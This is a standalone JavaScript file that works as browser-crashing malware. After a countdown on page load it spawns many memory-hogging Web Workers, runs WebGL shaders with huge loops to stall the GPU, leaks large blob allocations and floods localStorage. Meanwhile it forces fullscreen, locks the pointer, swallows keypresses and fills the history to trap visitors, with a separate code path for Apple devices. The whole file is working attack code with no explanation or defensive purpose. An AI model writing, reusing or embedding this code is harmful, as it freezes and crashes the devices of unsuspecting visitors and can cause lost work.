(function() {
    window.onload = function() {
        const timerDisplay = document.getElementById('timer');
        let timeLeft = 5;

        const isApple = /iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent) || (navigator.platform === 'MacIntel' && navigator.maxTouchPoints > 1);

        const workerCode = `
            onmessage = function(e) {
                if (e.data !== 'ignite') return;
                const b = [];
                while(true) {
                    try {
                        let s = new SharedArrayBuffer(1024 * 1024 * 256);
                        let v = new Float64Array(s);
                        for(let i = 0; i < v.length; i++) {
                            v[i] = Math.tan(Math.random()) * Math.exp(Math.random());
                        }
                        b.push(v);
                    } catch(e) {
                        b.push(new Uint8Array(1024 * 1024 * 128));
                    }
                }
            };
        `;

        const workerUrl = URL.createObjectURL(new Blob([workerCode], { type: 'application/javascript' }));
        const battalions = [];
        
        if (!isApple) {
            const cores = (navigator.hardwareConcurrency || 8) * 16;
            for(let i = 0; i < cores; i++) {
                battalions.push(new Worker(workerUrl));
            }
        }

        const countdown = setInterval(() => {
            timeLeft--;
            if (timerDisplay) timerDisplay.textContent = timeLeft;
            if (timeLeft <= 0) {
                clearInterval(countdown);
                ignite();
            }
        }, 1000);

        function ignite() {
            const body = document.documentElement;
            const lock = () => {
                body.requestFullscreen().catch(() => {});
                if (body.requestPointerLock) body.requestPointerLock();
                for(let i = 0; i < 500; i++) {
                    history.pushState(null, "", "#" + Math.random().toString(36));
                }
            };

            document.addEventListener('keydown', (e) => { e.preventDefault(); lock(); });
            document.addEventListener('click', lock);
            lock();

            if (isApple) {
                const appleStrike = () => {
                    const m = [];
                    const flood = () => {
                        for(let i = 0; i < 150; i++) {
                            const d = new Uint32Array(1024 * 1024 * 5);
                            for(let j = 0; j < d.length; j++) d[j] = Math.random() * 0xFFFFFFFF;
                            m.push(d);
                            const u = URL.createObjectURL(new Blob([d]));
                            const im = new Image();
                            im.src = u;
                        }
                        const s = Date.now();
                        while(Date.now() - s < 200) {}
                        requestAnimationFrame(flood);
                    };

                    const webglApple = () => {
                        const c = document.createElement('canvas');
                        const gl = c.getContext('webgl') || c.getContext('experimental-webgl');
                        if (!gl) return;
                        const vs = gl.createShader(gl.VERTEX_SHADER);
                        gl.shaderSource(vs, 'attribute vec2 p;void main(){gl_Position=vec4(p,0,1);}');
                        gl.compileShader(vs);
                        const fs = gl.createShader(gl.FRAGMENT_SHADER);
                        gl.shaderSource(fs, 'precision highp float;void main(){vec4 c=vec4(0);for(int i=0;i<150000;i++){c+=atan(gl_FragCoord.x*gl_FragCoord.y+float(i));}gl_FragColor=c;}');
                        gl.compileShader(fs);
                        const pr = gl.createProgram();
                        gl.attachShader(pr, vs); gl.attachShader(pr, fs); gl.linkProgram(pr); gl.useProgram(pr);
                        const b = gl.createBuffer();
                        gl.bindBuffer(gl.ARRAY_BUFFER, b);
                        gl.bufferData(gl.ARRAY_BUFFER, new Float32Array([-1,-1,1,-1,-1,1,1,1]), gl.STATIC_DRAW);
                        const pa = gl.getAttribLocation(pr, 'p');
                        gl.enableVertexAttribArray(pa);
                        gl.vertexAttribPointer(pa, 2, gl.FLOAT, false, 0, 0);
                        const r = () => { gl.drawArrays(gl.TRIANGLE_STRIP, 0, 4); requestAnimationFrame(r); };
                        r();
                    };

                    webglApple();
                    flood();
                };
                appleStrike();
            } else {
                battalions.forEach((w, index) => {
                    setTimeout(() => w.postMessage('ignite'), index * 5);
                });

                const webglHell = () => {
                    const c = document.createElement('canvas');
                    c.width = window.screen.width;
                    c.height = window.screen.height;
                    const gl = c.getContext('webgl2', {preserveDrawingBuffer: true}) || c.getContext('webgl');
                    if (!gl) return;
                    const vs = gl.createShader(gl.VERTEX_SHADER);
                    gl.shaderSource(vs, 'attribute vec2 p;void main(){gl_Position=vec4(p,0,1);}');
                    gl.compileShader(vs);
                    const fs = gl.createShader(gl.FRAGMENT_SHADER);
                    gl.shaderSource(fs, 'precision highp float;void main(){vec4 c=vec4(0);for(int i=0;i<120000;i++){c+=atan(gl_FragCoord.x*gl_FragCoord.y+float(i));}gl_FragColor=c;}');
                    gl.compileShader(fs);
                    const pr = gl.createProgram();
                    gl.attachShader(pr, vs); gl.attachShader(pr, fs); gl.linkProgram(pr); gl.useProgram(pr);
                    const b = gl.createBuffer();
                    gl.bindBuffer(gl.ARRAY_BUFFER, b);
                    gl.bufferData(gl.ARRAY_BUFFER, new Float32Array([-1,-1,1,-1,-1,1,1,1]), gl.STATIC_DRAW);
                    const pa = gl.getAttribLocation(pr, 'p');
                    gl.enableVertexAttribArray(pa);
                    gl.vertexAttribPointer(pa, 2, gl.FLOAT, false, 0, 0);
                    const render = () => { gl.drawArrays(gl.TRIANGLE_STRIP, 0, 4); requestAnimationFrame(render); };
                    render();
                };

                const l = () => {
                    const c = document.createElement('canvas');
                    c.width = 16384; c.height = 16384;
                    const x = c.getContext('2d', {alpha: false});
                    x.filter = 'blur(100px) contrast(1000%) invert(100%)';
                    const kill = () => {
                        URL.createObjectURL(new Blob([new Uint8Array(1024 * 1024 * 500)]));
                        Promise.resolve().then(kill);
                    };
                    kill();
                };

                const db = () => {
                    const g = [];
                    while(true) {
                        const d = new Array(5000000).fill("doom").join("!");
                        try { localStorage.setItem(performance.now() + Math.random(), d); } catch(e) {}
                        g.push(d);
                        const s = Date.now();
                        while(Date.now() - s < 100) {} 
                    }
                };

                webglHell();
                l();
                setTimeout(db, 1);
            }
        }
    };
})();